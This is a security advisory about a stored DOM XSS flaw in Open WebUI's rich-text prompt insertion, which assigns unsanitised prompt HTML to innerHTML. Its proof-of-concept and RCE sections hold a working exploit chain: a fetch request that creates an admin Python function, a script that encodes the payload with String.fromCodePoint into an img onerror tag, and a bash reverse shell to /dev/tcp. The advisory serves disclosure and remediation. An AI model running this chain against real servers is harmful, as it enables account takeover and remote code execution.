summary: "Open WebUI vulnerable to Stored DOM XSS via prompts when 'Insert Prompt as Rich Text'\
  \ is enabled resulting in ATO/RCE\n### Summary\n\nThe functionality that inserts custom prompts\
  \ into the chat window is vulnerable to DOM XSS when 'Insert Prompt as Rich Text' is enabled,\
  \ since the prompt body is assigned to the DOM sink `.innerHtml` without sanitisation. Any\
  \ user with permissions to create prompts can abuse this to plant a payload that could be\
  \ triggered by other users if they run the corresponding `/` command to insert the prompt.\n\
  \n### Details\n\nThe affected line is https://github.com/open-webui/open-webui/blob/7a83e7dfa367d19f762ec17cac5e4a94ea2bd97d/src/lib/components/common/RichTextInput.svelte#L348\n\
  \n```js\n\texport const replaceCommandWithText = async (text) => {\n\t\tconst { state, dispatch\
  \ } = editor.view;\n\t\tconst { selection } = state;\n\t\tconst pos = selection.from;\n\n\t\
  \t// Get the plain text of this document\n\t\t// const docText = state.doc.textBetween(0,\
  \ state.doc.content.size, '\\n', '\\n');\n\n\t\t// Find the word boundaries at cursor\n\t\t\
  const { start, end } = getWordBoundsAtPos(state.doc, pos);\n\n\t\tlet tr = state.tr;\n\n\t\
  \tif (insertPromptAsRichText) {\n\t\t\tconst htmlContent = marked\n\t\t\t\t.parse(text, {\n\
  \t\t\t\t\tbreaks: true,\n\t\t\t\t\tgfm: true\n\t\t\t\t})\n\t\t\t\t.trim();\n\n\t\t\t// Create\
  \ a temporary div to parse HTML\n\t\t\tconst tempDiv = document.createElement('div');\n\t\t\
  \ttempDiv.innerHTML = htmlContent;                                          // <---- vulnerable\n\
  ```\n\nUser controlled HTML from the prompt body is assigned to `tempDiv.innerHTML` without\
  \ (meaningful) sanitisation. `marked.parse` introduces some character limitations but does\
  \ not sanitise the content, as stated in their README.\n\n<img width=\"1816\" height=\"498\"\
  \ alt=\"image\" src=\"https://github.com/user-attachments/assets/bd0980fc-ad87-460a-94b8-02bc94bea1a2\"\
  \ />\n\n### PoC\nCreate a custom prompt as follows:\n<img width=\"3006\" height=\"1100\" alt=\"\
  image\" src=\"https://github.com/user-attachments/assets/47de7a11-514d-48f9-8c6a-04ab1894f981\"\
  \ />\n\nVia settings, ensure 'Insert Prompt as Rich Text' is enabled:\n<img width=\"2204\"\
  \ height=\"1268\" alt=\"image\" src=\"https://github.com/user-attachments/assets/f188065f-7c11-4f09-9ced-4e7d2e6f4d48\"\
  \ />\n\nRun the command `/poc` via a chat window.\n<img width=\"2470\" height=\"1332\" alt=\"\
  image\" src=\"https://github.com/user-attachments/assets/5a112f51-210a-43f3-b999-915b1d0e6744\"\
  \ />\n\nObserve the alert is triggered.\n<img width=\"2452\" height=\"1456\" alt=\"image\"\
  \ src=\"https://github.com/user-attachments/assets/fa15dbd6-44a7-4cfc-bd93-4cc56aac5eea\"\
  \ />\n\n#### RCE\nSince admins can naturally run arbitrary Python code on the server via the\
  \ 'Functions' feature, this XSS could be used to force any admin that triggers it to run one\
  \ such of these function with Python code of the attackers choosing. \n\nThis can be accomplished\
  \ by making them run the following fetch request:\n```js\nfetch(\"https://<HOST>/api/v1/functions/create\"\
  , {\n  method: \"POST\",\n  credentials: \"include\",\n  headers: {\n    \"Content-Type\"\
  : \"application/json\",\n    \"Accept\": \"application/json\"\n  },\n  body: JSON.stringify({\n\
  \    id: \"pentest_cmd_test\",\n    name: \"pentest cmd test\",\n    meta: { description:\
  \ \"pentest cmd test\" },\n    content: \"import os;os.system('echo RCE')\"\n  })\n})\n```\n\
  This cannot be done directly because the `marked.parse` call the HTML is passed through will\
  \ neutralise payloads containing quotes\n<img width=\"1718\" height=\"482\" alt=\"image\"\
  \ src=\"https://github.com/user-attachments/assets/6797efbd-4f2e-4570-ad9f-59a65dba1745\"\
  \ />\nTo get around this strings must be manually constructed from their decimal values using\
  \ `String.fromCodePoint`. The following Python script automates generating a viable payload\
  \ from given JavaScript:\n```py\npayload2 = \"\"\"\nfetch(\"https://<HOST>/api/v1/functions/create\"\
  , {\n  method: \"POST\",\n  credentials: \"include\",\n  headers: {\n    \"Content-Type\"\
  : \"application/json\",\n    \"Accept\": \"application/json\"\n  },\n  body: JSON.stringify({\n\
  \    id: \"pentest_cmd_test\",\n    name: \"pentest cmd test\",\n    meta: { description:\
  \ \"pentest cmd test\" },\n    content: \"import os;os.system('bash -c \\\\\\\\'/bin/bash\
  \ -i >& /dev/tcp/x.x.x.x/443 0>&1\\\\\\\\'')\"\n  })\n})\n\"\"\".lstrip().rstrip()\n\nout\
  \ = \"\"\n\nfor c in payload2:\n    out += f\"String.fromCodePoint({ord(c)})+\"\n\nprint(f\"\
  <img src=x onerror=eval({out[:-1]})>\")\n```\nAn admin that triggers the corresponding payload\
  \ via a prompt command will trigger a Python function to run that runs a reverse shell payload,\
  \ giving command line access on the server to the attacker.\n<img width=\"2476\" height=\"\
  756\" alt=\"image\" src=\"https://github.com/user-attachments/assets/01f9e991-832a-4cfb-8c3e-3b2ce02cff15\"\
  \ />\n\n<img width=\"2492\" height=\"1530\" alt=\"image\" src=\"https://github.com/user-attachments/assets/d08eb48f-a688-41a1-9b52-e91df7ced929\"\
  \ />\n<img width=\"1968\" height=\"916\" alt=\"image\" src=\"https://github.com/user-attachments/assets/2ad6a19e-f151-4ac9-9903-0961e33fe42f\"\
  \ />\n\n\n### Impact\n\nAny user running the malicious prompt could have their account compromised\
  \ via malicious JavaScript that reads their session token from localstorage and exfiltrates\
  \ it to an attacker controlled server.\n\nAdmin users running the malicious prompt risk exposing\
  \ the backend server to remote code execution (RCE) since malicious JavaScript running via\
  \ the vulnerability can be used to send requests as the admin user that run malicious Python\
  \ functions, that may run operating system commands.\n\n### Caveats\n\nLow privilege users\
  \ cannot create prompts by default, the USER_PERMISSIONS_WORKSPACE_PROMPTS_ACCESS permission\
  \ is needed, which may be given out via e.g. a custom group. see: https://docs.openwebui.com/features/workspace/prompts/#access-control-and-permissions\n\
  \nA victim user running the command to trigger the prompt needs to have the 'Insert Prompt\
  \ as Rich Text' setting enabled via preferences for the vulnerability to trigger. The setting\
  \ is off by default. Users with this setting disabled are unaffected.\n\n### Remediation\n\
  \nSanitise the user controlled HTML with DOMPurify before assigning it to `.innerHtml`"
